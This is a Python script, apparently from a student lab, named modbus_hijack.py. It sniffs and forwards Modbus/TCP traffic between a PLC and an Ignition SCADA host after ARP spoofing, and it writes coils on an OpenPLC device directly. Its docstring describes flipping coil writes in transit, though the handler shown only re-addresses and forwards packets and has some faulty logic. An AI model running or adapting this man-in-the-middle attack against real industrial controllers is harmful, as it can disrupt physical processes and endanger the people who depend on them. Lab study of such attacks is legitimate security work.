#!/usr/bin/env python3
"""
file:       modbus_hijack.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       02/09/2023, National Pizza Day!
description:
    This reads and writes to a coil
"""

import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from scapy.all import *
import struct
import arp_spoof
import final_exploit

OPEN_PLC_IP = "192.168.1.35"
PLC_IP = None
PLC_MAC = None
IGNITION_IP = None
IGNITION_MAC = None

# MODBUS function code
FC_READ_COIL    = 1
FC_DISCREET_IN  = 2
FC_SINGLE_COIL  = 5

# MODBUS output values
OUT_ON = 0xFF00
OUT_OFF = 0x0000

# address of modbus device
OPENPLC_ADDR = "192.168.1.35"
OPENPLC_PORT = 502
IX100_0 = 800
IX100_1 = 801
IX100_2 = 802
IX100_3 = 803
IX100_4 = 804
IX100_5 = 805
IX100_6 = 806
IX100_7 = 807

# maps a transaction id -> proper response 
# this is needed to distinguish between requests and responses
STATE_DICT = dict()

# packet filter 
#FILTER = "host %s and port 502" % OPEN_PLC_IP # filter by plc host and mbtcp port
FILTER = "tcp and (not arp) and (host %s or host %s)"
def packet_handler( pkt ):
    """
    description:
        the function that handles what to do with a packet
    parameters:
        packet -> the packet recieved
    """
    # check if packet has paylaod
    pkt.show()
    print( pkt.summary() )
    print("-"*80)

    # change and forward
    dmac = None
    dip = None
    smac = None
    sip = None

    if( pkt[IP].dst == PLC_IP ):
        mac = PLC_MAC
    elif( pkt[IP].dst == IGNITION_IP  ):
        mac = IGNITION_MAC

    try:
        trans_id, proto_id, length, unit_id,func_code, = \
                struct.unpack( "!HHHBB", pkt[Raw].load[:8] )

        print( trans_id )
    except Exception as e:
        print( e, pkt.summary() )
    # Change packet
    pkt[Ether].dst = mac
    packets = srp( pkt, iface="enp0s20f0u1" )
    print( "sent\n" )
    return

def modbus_hijack( pip, pmac, iip, imac):
    """
    description:
        The modbus hijack attack
        starts sniffing for packets and when a write coil modbus
        packet is found, it will change the value to be the opposite
        (on -> off, off -> on) and forward it 
    """
    global PLC_IP
    global PLC_MAC
    global IGNITION_IP
    global IGNITION_MAC
    PLC_IP = pip
    PLC_MAC = pmac
    IGNITION_IP = iip
    IGNITION_MAC = imac
    # sniff time
    pkts = sniff( iface="enp0s20f0u1", prn=packet_handler, filter=(FILTER % (PLC_IP, IGNITION_IP ) ) )
    """
    pkts = sniff( offline="modbus.pcap", handler=packet_handler, filter=FILTER )
    for pkt in pkts:
        print( "summary:", pkt.summary() )
    """
    return

def main():
    """
    description:
        the driver function     
    """
    # connect to PLC
    client = ModbusClient( OPENPLC_ADDR, port=OPENPLC_PORT )
    client.connect()
    print( client )

    rr = client.read_coils( IX100_0 )
    print( rr )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.write_coil( IX100_6, True, unit=1 )
    client.read_coils( IX100_0 )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.close()  
    return

if( __name__ == "__main__" ):
    main()
